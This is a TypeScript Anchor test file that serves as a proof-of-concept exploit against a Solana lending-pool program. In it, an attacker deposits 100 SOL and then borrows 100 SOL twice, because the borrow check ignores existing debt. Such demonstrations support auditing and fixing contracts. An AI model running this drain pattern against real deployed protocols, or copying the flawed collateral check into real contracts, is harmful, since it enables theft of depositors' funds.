import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { LendingPool } from "../target/types/lending_pool";
import { expect } from "chai";
import {
  SystemProgram,
  LAMPORTS_PER_SOL,
  PublicKey,
} from "@solana/web3.js";

describe("Exploit: Collateral check ignores existing debt", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.LendingPool as Program<LendingPool>;
  const attacker = provider.wallet;

  let poolPda: PublicKey;
  let poolBump: number;
  let vaultPda: PublicKey;
  let userPda: PublicKey;

  before(async () => {
    // Derive PDAs
    [poolPda, poolBump] = PublicKey.findProgramAddressSync(
      [Buffer.from("pool")],
      program.programId
    );
    [vaultPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("vault"), poolPda.toBuffer()],
      program.programId
    );
    [userPda] = PublicKey.findProgramAddressSync(
      [Buffer.from("user"), poolPda.toBuffer(), attacker.publicKey.toBuffer()],
      program.programId
    );

    // Initialize pool with 5% interest, 80% liquidation threshold
    await program.methods
      .initializePool(new anchor.BN(500), new anchor.BN(80))
      .accounts({
        pool: poolPda,
        poolVault: vaultPda,
        authority: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Seed pool vault with 1000 SOL (simulating other depositors)
    const seedTx = new anchor.web3.Transaction().add(
      SystemProgram.transfer({
        fromPubkey: attacker.publicKey,
        toPubkey: vaultPda,
        lamports: 1000 * LAMPORTS_PER_SOL,
      })
    );
    await provider.sendAndConfirm(seedTx);
  });

  it("should allow borrowing more than deposited collateral", async () => {
    const depositAmount = 100 * LAMPORTS_PER_SOL;
    const borrowAmount = 100 * LAMPORTS_PER_SOL;

    // Step 1: Deposit 100 SOL as collateral
    await program.methods
      .deposit(new anchor.BN(depositAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    const balanceBefore = await provider.connection.getBalance(
      attacker.publicKey
    );

    // Step 2: Borrow 100 SOL — passes because deposited(100) >= 100
    await program.methods
      .borrow(new anchor.BN(borrowAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Step 3: Borrow ANOTHER 100 SOL — BUG: still passes because
    // deposited is still 100 and borrowed amount is never checked
    await program.methods
      .borrow(new anchor.BN(borrowAmount))
      .accounts({
        pool: poolPda,
        userAccount: userPda,
        poolVault: vaultPda,
        owner: attacker.publicKey,
        systemProgram: SystemProgram.programId,
      })
      .rpc();

    // Verify: attacker borrowed 200 SOL against only 100 SOL collateral
    const userAccount = await program.account.userAccount.fetch(userPda);
    expect(userAccount.deposited.toNumber()).to.equal(depositAmount);
    expect(userAccount.borrowed.toNumber()).to.equal(borrowAmount * 2);

    // Attacker effectively stole 100 SOL from the pool
    console.log(
      `Deposited: ${userAccount.deposited.toNumber() / LAMPORTS_PER_SOL} SOL`
    );
    console.log(
      `Borrowed: ${userAccount.borrowed.toNumber() / LAMPORTS_PER_SOL} SOL`
    );
    console.log("EXPLOIT CONFIRMED: Borrowed 2x collateral");
  });
});
